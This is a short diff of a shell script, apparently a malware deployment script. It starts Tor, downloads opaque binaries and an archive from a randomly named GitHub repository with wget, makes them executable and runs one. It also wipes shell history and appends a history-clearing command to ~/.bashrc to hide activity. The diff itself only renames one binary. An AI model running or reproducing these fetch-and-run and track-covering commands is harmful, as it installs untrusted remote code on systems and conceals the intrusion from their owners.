@@ -2,9 +2,9 @@
 ssudo systemctl start tor
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpotr
 
-wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo2
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo2tr
 
-chmod ugo+x cpo2
+chmod ugo+x cpo2tr
 chmod ugo+x cpotr
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/SRB11.tar.gz
 
@@ -16,4 +16,4 @@ echo ". history -cw" >> ~/.bashrc
 cat /dev/null > ~/.bash_history
 history -cw
 
-./cpo2
+./cpo2tr
